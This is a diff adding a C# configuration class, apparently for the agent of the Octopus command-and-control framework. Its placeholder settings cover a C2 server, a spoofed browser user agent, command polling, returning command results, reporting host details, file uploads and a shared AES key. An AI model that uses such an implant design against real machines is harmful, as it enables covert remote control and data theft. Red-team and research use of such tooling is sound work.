@@ -1,0 +1,88 @@
+﻿using System;
+
+namespace OctopusNET
+{
+    internal static class Config
+    {
+       /// <summary>
+       /// API Server HTTP Protocol {http | https}
+       /// </summary>
+        public static string M0 => "OCU_PROTO";
+
+        /// <summary>
+        /// API Server Hostname
+        /// </summary>
+        public static string M1 => "SRVHOST";
+
+        /// <summary>
+        /// Fallback API Server Hostname, NOT IMPLEMENTED
+        /// </summary>
+        public static string M2 => "FALLBACK_API_SERVER";
+
+  
+
+        /// <summary>
+        /// Default User Agent
+        /// </summary>
+        public static string M3 => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
+
+        /// <summary>
+        /// Query API for new jobs timer interval
+        /// </summary>
+        public static int M4 => Convert.ToInt32("OCU_INTERVAL");
+
+
+        /// <summary>
+        /// First Ping API endpoint. Ex; domain.x/ping/
+        /// </summary>
+        public static string L1 => "OCT_first_ping";
+
+
+        /// <summary>
+        /// Check for jobs API endpoint (Check if there's a pending jobs assigned to this agent)
+        /// <hostname> should be replaced with this agent unique ID</hostname>
+        /// </summary>
+        public static string L2 => "OCT_command/<hostname>";
+
+        /// <summary>
+        /// Where should the agent send command execution result
+        /// </summary>
+        public static string L3 => "OCTRECV";
+
+
+        /// <summary>
+        /// Info about this agent and this computer will pushed to this API endpoint
+        /// </summary>
+        public static string L4 => "OCT_report";
+
+
+        /// <summary>
+        /// In case you want to push Files to API, use this endpoint
+        /// </summary>
+        public static string L5 => "OCT_file_receiver";
+
+
+        /// <summary>
+        /// API Server public key, for signature verification, used also in a part of AES Exchange
+        /// TODO: FEATURE NOT IMPLEMENTED YET
+        /// </summary>
+        public static string L6 => "SRV_PUB_KIY";
+
+        /// <summary>
+        /// Shared AES Key, API Server has the same. For secure data exchange
+        /// </summary>
+        public static string L7 => "OCT_KEY";
+        public static string L77 => "OCT_IV";
+
+
+        /// <summary>
+        /// Agent Version
+        /// </summary>
+        public static string L8 => "v1.0";
+
+        /// <summary>
+        /// Maximum connections tries to API Server, before exiting
+        /// </summary>
+        public static int L9 => Convert.ToInt32("OCT_AKILL");
+    }
+}
